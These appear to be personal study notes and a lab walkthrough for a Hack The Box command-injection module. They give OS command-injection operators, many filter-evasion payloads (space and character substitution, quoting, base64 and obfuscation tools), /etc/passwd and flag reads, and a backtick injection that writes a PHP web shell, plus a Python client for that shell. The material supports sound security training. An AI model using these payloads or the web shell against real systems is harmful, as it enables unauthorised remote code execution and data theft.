# HTB: Command Injections Module


## **Exploitation**

### Command Injection Methods

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
| --- | --- | --- | --- |
| Semicolon | `;` | `%3b` | Both |
| New Line | `\n` | `%0a` | Both |
| Background | `&` | `%26` | Both (second output generally shown first) |
| Pipe | `|` | `%7c` | Both (only second output is shown) |
| AND | `&&` | `%26%26` | Both (only if first succeeds) |
| OR | `||` | `%7c%7c` | Second (only if first fails) |
| Sub-Shell | ```` | `%60%60` | Both **(Linux-only)** |
| Sub-Shell | `$()` | `%24%28%29` | Both **(Linux-only)** |

### Detection:

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/1.png)

if we tried to inject from the input field, the website will reject it and return this error: 

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/2.png)

But note, in the network tab, there is no connection to the back-end when we pressed check, this indicates that the user input validation is happening in the front-end only. By viewing the source code, you will see the input validation.

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/3.png)

Front-end validations are usually not enough to prevent injections, as they can be very easily bypassed by sending custom HTTP requests directly to the back-end. 

### Bypassing Front-end Validation

The easiest method to customize the HTTP requests being sent to the back-end server is to use a web proxy that can intercept the HTTP requests being sent by the application. In this example, we will use burp to intercept the POST request and send it to the Repeater to edit the request

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/4.png)

```bash
ip=||whoami                  # OR
ip=127.0.0.1+%26%26+whoami   # AND
ip=127.0.0.1%0awhoami        # \n newline
```

### **Other Injection Operators**

Such operators can be used for various injection types, like SQL injections, LDAP injections, XSS, SSRF, XXE, etc. We have created a list of the most common operators that can be used for injections:

| **Injection Type** | **Operators** |
| --- | --- |
| SQL Injection | `'` `,` `;` `--` `/* */` |
| Command Injection | `;` `&&` |
| LDAP Injection | `*` `(` `)` `&` `|` |
| XPath Injection | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection | `;` `&` `|` |
| Code Injection | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00` |
| Object Injection | `;` `&` `|` |
| XQuery Injection | `'` `;` `--` `/* */` |
| Shellcode Injection | `\x` `\u` `%u` `%n` |
| Header Injection | `\n` `\r\n` `\t` `%0d` `%0a` `%09` |

## **Filter Evasion**

### **Filter/WAF Detection**

Same previous example but with security mechanism in place. 

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/5.png)

This error message can be displayed in various ways. In this case, we see it in the field where the output is displayed, meaning that it was detected and prevented by the `PHP` web application itself. 

- `If the error message displayed a different page, with information like our
 IP and our request, this may indicate that it was denied by a WAF`.

```html
127.0.0.1; whoami
```

Other than the IP (which we know is not blacklisted), we sent:

1. A semi-colon character `;`
2. A space character 
3. A `whoami` command

So, the web application either `detected a blacklisted character` or `detected a blacklisted command`, or both. So, let us see how to bypass each

**Blacklisted Characters:**The `PHP` code may look something like the following:

```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

If any character in the string we sent matches a character in the blacklist, our request is denied. Before we start our attempts at bypassing the filter, we should try to identify which character caused the denied request. 

**Identifying Blacklisted Character:** This is done by reducing our request to one character at a time, and see how trigger the **Invalid Input** message

```bash
ip=127.0.0.1         # no error
ip=127.0.0.1;        # error 
ip=127.0.0.1+||      # error
ip=127.0.0.1+%7c%7c  # OR url encoded. error
ip=127.0.0.1+%26%26  # AND &&. error
ip=127.0.0.1\n       # error
ip=127.0.0.1+%7c     # (pipe) error
ip=127.0.0.1%20|     # pipe. error
ip=127.0.0.1%0a      # new line url encode. No error
```

### **Bypassing Space Filters**

we did find an operator we can use for injection, but we run into another character blacklist:

```bash
ip=127.0.0.1+\n+whoami  # error
ip=127.0.0.1+\n+        # error
```

 The space character is blacklisted as well. A space is a commonly blacklisted character, especially if the input should not contain any spaces, like an IP, for example. Still, there are many ways to add a space character without actually using the space character!

**Space bypass characters:** 

```bash
Using tabs:                                   ip=127.0.0.1%0a%09
Using the ($IFS) Linux Environment Variable:  ip=127.0.0.1%0a$(IFS) 
Using Brace Expansion:                        ip=127.0.0.1%0a{ls,-al}
Using Sub-Shell:                              ip=127.0.0.1%0a$(rev<<<'di')
```

- check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.
    
    

### **Bypassing Other Blacklisted Characters**

In linux, we can utilize the environment variable to extract some characters that has been blacklisted by the website. For example, in the PATH env variable:

```bash
$ echo $PATH                                         
/home/kali/gems/bin:/home/kali/.cargo/bin:/home/kali/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kali/.dotnet/tools
```

we can bypass the slash character by extracting the slash from the variable, like this

```bash
$ echo ${PATH:0:1}
/
```

same thing with other env variables. **Bypassing semicolon**: 

```bash
$ echo ${LS_COLORS}
rs=0:di=01;......etc
$ echo ${LS_COLORS:10:1} 
;
```

- The `printenv` command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.

**Linux**: 

These examples assume a standard environment. The syntax is `${VAR:position:length}`.

| Goal Character | Command | Logic / Source |
| --- | --- | --- |
| **Forward Slash (`/`)** | `${HOME:0:1}` | Usually `/home/user` (takes the 1st char) |
| **Semicolon (`;`)** | `${LS_COLORS:10:1}` | Found in the mapping string of `$LS_COLORS` |
| **Colon (`:`)** | `${PATH:4:1}` | Typically the separator in `/usr:/bin` |
| **Dot (`.`)** | `${PWD: -2:1}` | If you are in a hidden folder, or use `${BASH_SOURCE:0:1}` |
| **Space (     ``)** | `${IFS:0:1}` | `$IFS` (Internal Field Separator) usually starts with a space |

**Windows:** 

1. CMD Character Slicing: In CMD, the syntax is `%VARIABLE:~start,length%`. If the length is negative, it trims that many characters from the end.

| Goal Character | Command | Logic |
| --- | --- | --- |
| **Backslash (`\`)** | `echo %HOMEPATH:~6,-11%` | Extracts the first `\` from `\Users\username` |
| **Space ( ``)** | `echo %PROGRAMFILES:~10,1%` | Extracts the space in `C:\Program Files` |
| **Colon (`:`)** | `echo %OS:~2,1%` | Extracts the colon from `Windows_NT` (varies by OS) |
| **Letter 'C'** | `echo %SystemDrive:~0,1%` | Extracts `C` from `C:` |
| **Period (`.`)** | `echo %PATHEXT:~0,1%` | Extracts the dot from `.COM;.EXE...` |
| **Semicolon (`;`)** | `echo %PATHEXT:~4,1%` | Extracts the separator between extensions |

2. PowerShell Character Indexing: PowerShell treats environment variables as strings (which are arrays of characters). You can access a specific character by its index: `$env:VAR[index]`.

| Goal Character | Command | Source Variable Value (Typical) |
| --- | --- | --- |
| **Backslash (`\`)** | `$env:HOMEPATH[0]` | `\Users\YourName` |
| **Space ( ``)** | `$env:PROGRAMFILES[10]` | `C:\Program Files` |
| **Period (`.`)** | `$env:PATHEXT[0]` | `.COM;.EXE;.BAT` |
| **Semicolon (`;`)** | `$env:PATHEXT[4]` | `.COM;.EXE` |
| **Colon (`:`)** | `$env:ComSpec[1]` | `C:\Windows\system32\cmd.exe` |
| **Forward Slash (`/`)** | `([char]47)` | *Bonus: Using Type Casting if `$env` fails* |

**Testing: Bypassing blacklisted character in Linux OS** 

```bash
ip=127.0.0.1${LS_COLORS:10:1}${IFS}  # no error
```

The above test worked, but when i passed a command, it get blocked

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/6.png)

```bash
man ascii
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/7.png)

the character before ; is : 

```bash
$  echo $(tr '!-}' '"-~'<<<:)
;
```

testing:

```bash
─$ echo ${PATH:0:1} 
/
$ ls ${PATH:0:1}home
kali
```

```bash
ip=127.0.0.1${LS_COLORS:10:1}${IFS}ls${IFS}/home              # error
ip=127.0.0.1${LS_COLORS:10:1}${IFS}ls${IFS}${PATH:0:1}home    # No result
ip=127.0.0.1%0a${IFS}ls,${PATH:0:1}home                       # No result
ip=127.0.0.1%0a${IFS}{ls,${PATH:0:1}home}                     # Success 
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/8.png)

### **Bypassing Blacklisted Commands**

| **Technique** | **Linux (Bash)** | **Windows (CMD)** | **Windows (PowerShell)** |
| --- | --- | --- | --- |
| **Quotes** | `w'h'o'am'i` | `w"h"o"am"i` | `w'h'o'am'i` |
| **Backslash** | `w\ho\am\i` | *N/A* | *N/A* |
| **Positional Params** | `who$@ami` | *N/A* | *N/A* |
| **Carets** | *N/A* | `wh^o^ami` | *N/A* |
| **Empty Variables** | `who${x}ami` | `%x%whoami` | `$x+whoami` |
| **Case Swapping** | *N/A (Case Sensitive)* | `WhOaMi` | `wHoAmI` |
| **Reversing** | `$(echo imao hw | rev)` | *N/A* |

**Testing:** We did were able to list the files, but we cant cat them and it seems these commands are blocked:

```bash
cat,id,whoami..etc
```

I tried to cat the content of the file inside the home folder and I got this error

```bash
ip=127.0.0.1%0a${IFS}{cat,${PATH:0:1}home${PATH:0:1}1nj3c70r}
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/9.png)

1. **Quotation**: Dont forget to close the quote. If not, it wont execute
    
    ```bash
    $ wh"o"am'i'   
    kali
    ```
    
    ```bash
    ip=127.0.0.1%0a'i'd     
    ip=127.0.0.1%0a"i"d     
    ip=127.0.0.1%0ai"d"    
    ```
    
2. backslash `\` and the positional parameter character `$@`.
    
    ```bash
    $ wh\oam$@i 
    kali
    ```
    
    That wont work on the target  because it contains blacklisted characters
    
    ```bash
    ip=127.0.0.1%0awh\oam$@i
    ```
    
    It will work if we removed the slash
    
    ```bash
    ip=127.0.0.1%0awhoam$@i
    ```
    
3. **Empty Variable:** 
    
    ```bash
    $ whoa${x}mi
    kali
    ```
    
    ```bash
    ip=127.0.0.1%0awhoam${x}i   # passed
    ```
    
4. **Reversing:**
    
    ```bash
    $ $(rev<<<'imaohw')
    kali
    ```
    
    ```bash
    ip=127.0.0.1%0a$(rev<<<'imaohw')
    ```
    

Now,  back to our example: View the content of the file inside the home directory

```bash
ip=127.0.0.1%0a${IFS}{c'a't,${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt}
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/10.png)

### **Advanced Command Obfuscation**

**Testing**: 

1. **Case Insensitivity** 
    
    **Windows**: Unlike Linux, Windows is case-insensitive. If a filter looks for `whoami`, it might not look for `WhoAmI`.
    
    - **Example:** `127.0.0.1 && WhOaMi`
    
    **For** **Linux**, we can use the `tr` command to turn the command into an all-lowercase word
    
    ```bash
    $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
    kali
    ```
    
    But in this command it contains spaces which are filtered, so replace the space with tab
    
    ```bash
    ip=127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
    ```
    
2.  **Using Shell Variables (Linux)**
    
    You can assign parts of a command to variables and then combine them. This hides the full word from the filter.
    
    - **Payload:** `a=who; b=ami; $a$b`
    - **Why it works:** The filter sees `a=who` and `b=ami`, but never the string `whoami`.
    
    ```bash
    $ a=who;b=ami;$a$b
    kali
    ```
    
    I tried to use it with semicolon, it passed the filtering but with no execution
    
    ```bash
    ip=127.0.0.1%0aa=who${LS_COLORS:10:1}b=ami${LS_COLORS:10:1}$a$b
    ```
    
    next, I separated the commands with new-line character (%0a url coded) and it worked
    
    ```bash
    ip=127.0.0.1%0aa=who%0ab=ami%0a$a$b
    ```
    
3. **Base64 Encoding**
    
    This is the "gold standard" for bypassing strict filters because it completely changes the character set of your command.
    
    - **Linux:** `echo "whoami" | base64` → `d2hvYW1pCg==`
        - **Payload:** `echo d2hvYW1pCg== | base64 -d | bash`
        
        ```bash
        $ echo d2hvYW1pCg== | base64 -d | bash
        kali
        ```
        
        The echo command and the pipe are filtered. So, we will create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:
        
        ```bash
        $ echo "whoami" | base64   
        d2hvYW1pCg==              
        $ bash<<<$(base64 -d<<<d2hvYW1pCg==)                           
        kali
        ```
        
        `Note, we used <<< instead of pipe |` 
        
        ```bash
        ip=127.0.0.1%0abash<<<$(base64%09-d<<<d2hvYW1pCg==)
        ```
        
    - **Windows (PowerShell):** PowerShell has a built-in `EncodedCommand` flag.
        - **Payload:** `powershell -e d2hvYW1p`
4. **The Uninitialized Variable (Linux)**
    
    In Bash, if you reference a variable that hasn't been set, it evaluates to nothing. You can sprinkle these into commands to break up blacklisted words.
    
    - **Example:** `cat${u} /etc${u}/passw${u}d`
    - **Logic:** `${u}` is empty, so Bash sees `cat /etc/passwd`.
    
    ```bash
    $ cat${u} te${u}st${u}.txt
    test
    ```
    
    cat /etc/passwd 
    
    ```bash
    ip=127.0.0.1%0ac${x}at%09${PATH:0:1}etc${PATH:0:1}passwd
    ```
    
5. **Wildcards (Linux)**
    
    If `cat` and `passwd` are blocked, you can use globbing (wildcards) to refer to the files without typing the full name.
    
    - **Example:** `c'a't /e?c/pa??wd`
    - **Example:** `/bi?/[w]hoami`
        
        ```bash
        $ c'a't te?t.txt          
        test
        ```
        
        ```bash
        ip=127.0.0.1%0ac${x}at%09${PATH:0:1}e?c${PATH:0:1}pa?sw?
        ```
        

**Challenge:** Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 

```bash
$ echo "find /usr/share/ | grep root | grep mysql | tail -n 1 " | base64   
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEgCg==
```

```bash
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDEgCg==)
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/11.png)

### Evasion tools

**Linux** ([Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)):

**Installation:** 

1. Create a python virtual environment and activate it.
    
    ```bash
    $ python3 -m venv bashfuscator-venv
    $ source bashfuscator-venv/bin/activate
    ```
    
2. Install and update `pip` and `setuptools` to the latest versions (not version 65):
    
    ```bash
    pip install --upgrade pip setuptools wheel
    ```
    
3. Install Bashfuscator in "editable" mode: Instead of `setup.py`, run this command inside the `Bashfuscator` folder:
    
    ```bash
    pip install -e .
    ```
    
    *(The `.` tells pip to install the package located in the current directory).*
    

Testing: 

```bash
$ ./bashfuscator -h
usage: bashfuscator [-h] [-l] [-c COMMAND | -f FILE | --stdin] [-o OUTFILE] [-q] [--clip]
                    [--test] [-s {1,2,3}] [-t {1,2,3}] [--layers LAYERS]
                    [--include-binaries BINARIES [BINARIES ...] |
                    --exclude-binaries BINARIES [BINARIES ...]] [--no-file-write]
                    [--write-dir WRITE_DIR] [--choose-mutators MUTATOR [MUTATOR ...] |
                    --choose-all MUTATOR [MUTATOR ...]] [--no-mangling]
                    [--no-binary-mangling] [--binary-mangle-percent {1..100}]
                    [--no-random-whitespace] [--random-whitespace-range NUM,NUM]
                    [--no-insert-chars] [--insert-chars-range NUM,NUM]
                    [--no-misleading-commands] [--misleading-commands-range NUM,NUM]
                    [--no-integer-mangling] [--no-integer-expansion]
                    [--no-integer-base-randomization]
                    [--integer-expansion-depth INTEGER_EXPANSION_DEPTH]
                    [--no-terminator-randomization] [--full-ascii-strings] [--debug]

....
                                                              
```

- Usage: https://bashfuscator.readthedocs.io/en/latest/Usage.html

view all the mutations with the switch `-l`

Testing: obfuscating `whoami` command

```bash
 ./bashfuscator -c whoami --choose-mutators command/case_swapper --no-mangling -s 1 -t 1 --layer 1
[+] Payload:

${!#} <<< "$(FN='WHOAMI';printf %s "${FN~~}";)"

[+] Payload size: 47 characters
```

encoded:

```powershell
 ./bashfuscator -c "whoami" --no-mangling --choose-mutators command/case_swapper encode/base64 --test
[+] Payload:

printf %s "$(printf "JHshI30gPDw8ICIkKERhR2kydFk9J1dIT0FNSSc7cHJpbnRmICVzICIke0RhR2kydFl+fn0iOyki"|base64 -d)"|bash

[+] Payload size: 115 characters
[+] Testing payload:

kali
```

Windows([DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)):

Installation:

```powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/12.png)

```powershell
Invoke-DOSfuscation>  TUTORIAL

                                                                                                  
TUTORIAL :: Here is a quick tutorial showing you how to get your DOSfuscation on:                 

1) Load a Cmd/PowerShell command (SET COMMAND) or a path/URL to a command.                        
   SET COMMAND dir C:\Windows\System32\ | findstr calc\.exe
   Or                                                                                             
   SET COMMANDPATH https://bit.ly/L3g1t
                                                                                                  
2) (Optional) Set FinalBinary (SET FINALBINARY) to be Cmd, PowerShell or None.                    
   NOTE: If setting a PowerShell command, FinalBinary must be set to PowerShell.
   SET FINALBINARY PowerShell
                                                                                                  
3) Navigate through the obfuscation menus where the options are in YELLOW.                        
   GREEN options apply obfuscation.
   Enter BACK/CD .. to go to previous menu and HOME/MAIN to go to home menu.
   E.g. Enter PAYLOAD,CONCAT & then 1 to apply basic concatenation obfuscation.

4) Enter TEST/EXEC to test the obfuscated command locally.                                        
   Enter SHOW to see the currently obfuscated command.

5) Enter COPY/CLIP to copy obfuscated command out to your clipboard.                              
   Enter OUT to write obfuscated command out to disk.

6) Enter RESET to remove all obfuscation and start over.                                          
   Enter UNDO to undo last obfuscation.
   Enter HELP/? for help menu.

And finally the obligatory "Don't use this for evil, please" :)                                   
                                                                                                  

Choose one of the below options:

[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation

```

Testing: 

```powershell
Invoke-DOSfuscation\Encoding> SET COMMAND whoami 
                                                                                                  
                                                                                                  
Successfully set Command:                                                                         
whoami                                                                                            
                                                                                                  

Choose one of the below Encoding options to APPLY to current payload:

[*] ENCODING\1          Basic env var encoding
[*] ENCODING\2          Medium env var encoding
[*] ENCODING\3          Intense env var encoding

Invoke-DOSfuscation\Encoding> 2

Executed:
  CLI:  Encoding\2
  FULL: Out-EnvVarEncodedCommand -StringToEncode $Command -ObfuscationLevel 2 -MaintainCase       
                                                                                                  
Result:
%SystemRoot:~8,1%hoam%APPDATA:~-3,-2%
                                                                                                  
```

## **Skills Assessment**

Pentest a file manager web application for command injection vulnerability.

test-1: home page

```powershell
GET /index.php?to=

GET /index.php?to=&amp;uname 
```

test-2: download file option

```powershell
GET /index.php?to=&dl=2289228124.txt HTTP/1.1
Host: 83.136.255.53:36862
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.255.53:36862/index.php?to=&view=2289228124.txt
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=9tfpq41o1nbkcc57b02atgst24
Connection: keep-alive

HTTP/1.1 200 OK
Date: Mon, 19 Jan 2026 10:54:09 GMT
Server: Apache/2.4.41 (Ubuntu)
Cache-Control: public
Content-Transfer-Encoding: binary
Content-Disposition: attachment;filename="2289228124.txt"
Accept-Ranges: bytes
Content-Range: bytes 0-30/31
Content-Length: 31
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: $contentType

this is just a random document
```

test-3: quick view option

```powershell
GET /index.php?to=&view=51459716.txt&quickView=2 HTTP/1.1
Host: 83.136.255.53:36862
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: text/html, */*; q=0.01
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Referer: http://83.136.255.53:36862/index.php?to=
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=9tfpq41o1nbkcc57b02atgst24
Connection: keep-alive
```

test-4: used the copy feature to copy a rondom file into the tmp:

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s1.png)

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s2.png)

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s3.png)

I kept testing till I found this error message!

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s4.png)

so it look like it triggered because of the `+` symbol. I tried multiple character to see which one is filtered: 

```powershell
+ -> filtered
; -> filtered
\ -> returned this error: Error while moving: mv: missing destination file operand after '/var/www/html/files/605311066.txt /var/www/html/files/tmp' Try 'mv --help' for more information.
/ -> filtered
| -> filtered
|| -> filtered
\n -> returned this error: Error while moving: mv: cannot stat '/var/www/html/files/605311066.txtn': No such file or directory
\\n -> returned this error: Error while moving: mv: cannot stat '/var/www/html/files/605311066.txt\n': No such file or directory
%0a -> filtered
${LS_COLORS:10:1}  -> dosent return ;
%09 -> not filtered
() -> filered. also the url encoded
`` -> NOT filterd!!!

```

the command

```bash
mv /var/www/html/files/[from] /var/www/html/files/[to]
```

If you inject into `from`, you are in the middle. If you inject into `to`, you are at the **end**.

Backticks allow for **inline command execution**, meaning the shell will execute whatever is inside them first and then place the result into the main command. Since the input is being placed into an `mv` command, we can use backticks to execute our command and "leak" the result through the error message. 

So instead of returning this error message when moving a file that doesn't exist

```bash
Error while moving: mv: cannot stat '/var/www/html/files/bluuh': No such file or directory
```

we will use backticks to leak the result into the error message, and the result will be like this:

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s5.png)

```bash
GET /index.php?to=.&from=.%60who'a'mi%60&finish=0&move=0 HTTP/1.1
```

Listing files:

```bash
tmp%60'c'at%09..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt%60&
```

```bash
GET /files/tmp/index.php?to=.&from=.%60l's'%09..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}%60&finish=1&move=1
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s6.png)

finding the flag:

```bash
GET /files/tmp/index.php?to=.&from=.%60c'at'%09..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt%60&finish=1&move=1
```

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s7.png)

Injecting base64 encoded webshell 

```bash
$ cat web-shell.php                                                
<?php system($_GET['cmd']); ?>
                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cat web-shell.php| base64
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==
```

```bash
%60echo%09PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==%09|%09base64%09-d%09>%09shell.php%60

```

```bash
.%60base64%09-d%09<<<PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==%09>%09shell.php%60
```

Injecting xxe encoded webshell 

```bash
$ cat web-shell.php| xxd -p
3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e
0a
```

```bash
.%60xxd%09-r%09-p%09<<<3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%09>%09shell.php%60
```

payload:

```bash
GET /files/tmp/index.php?to=tmp&from=2561732172.txt%60xxd%09-r%09-p%09<<<3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e%09>%09shell.php%60&finish=1&move=1 HTTP/1.1
```

open the file and pass the cmd parameter and you will get a shell!!

 ![ALT](/HTB/Web_Penetration_Tester/Command_Injections/Images/s8.png)

Python code for interacting with the webshell

```python
import requests
import sys

url = "http://94.237.50.128:31291/files/tmp/shell.php"

print("--- Interacting with Web Shell ---")

while True:
	try:
		cmd = input("$ ")
		if cmd.lower() in ["exit", "quit"]:
			break

		parms = {'cmd': cmd}
		response = requests.get(url, params=parms, timeout=10)

		# print the response
		if response.status_code == 	200:
			print(response.text.strip())
		else:
				print(f"[!] Error: Server returned status {response.status_code}")
				
	except requests.exceptions.RequestException as e:
		print(f"[!] Connection Error: {e}")
```

```bash
─$ python3 shell.py
--- Interacting with Web Shell ---
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ ls
index.php
shell.php
$ pwd
/var/www/html/files/tmp
```